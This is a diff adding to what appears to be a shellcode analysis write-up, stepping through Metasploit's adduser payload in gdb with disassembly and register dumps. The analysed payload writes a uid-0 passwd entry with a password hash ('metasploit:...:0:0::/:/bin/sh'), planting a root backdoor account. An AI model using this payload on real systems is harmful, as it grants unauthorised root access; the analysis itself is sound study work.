@@ -261,3 +261,47 @@ ECX: 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X"
    0x404099 <code+89>:  pop    eax
    0x40409a <code+90>:  int    0x80
 ```
+This is then pushed onto the stack:
+```nasm
+0x00404095 <+85>:    push   ecx
+Then, the ```write()``` function is executed, which has a syscall number of ```0x4```:
+```
+$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h
+#define __NR_write 4
+
+SYNOPSIS         top
+       #include <unistd.h>
+
+       ssize_t write(int fd, const void *buf, size_t count);
+
+```
+So this takes the file descriptor as the first argument, data as the second, followed by the length of the data:
+
+```nasm
+0x00404097 <+87>:    push   0x4     
+0x00404099 <+89>:    pop    eax     ;eax=0x4 --> write()
+0x0040409a <+90>:    int    0x80    ;syscall
+```
+```
+0x00404099 in code ()
+gdb-peda$ stepi
+[----------------------------------registers-----------------------------------]
+EAX: 0x4
+EBX: 0xfffffff3
+ECX: 0x40406b ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X")
+EDX: 0x28 ('(')
+...
+
+...
+[-------------------------------------code-------------------------------------]
+   0x404096 <code+86>:  cld    
+   0x404097 <code+87>:  push   0x4
+   0x404099 <code+89>:  pop    eax
+=> 0x40409a <code+90>:  int    0x80
+```
+Then finally, the ```exit()``` function is called, with the syscall number ```0x1```:
+```nasm
+0x0040409c <+92>:    push   0x1     
+0x0040409e <+94>:    pop    eax       ;eax=0x1 --> exit()
+0x0040409f <+95>:    int    0x80      ;syscall
+```
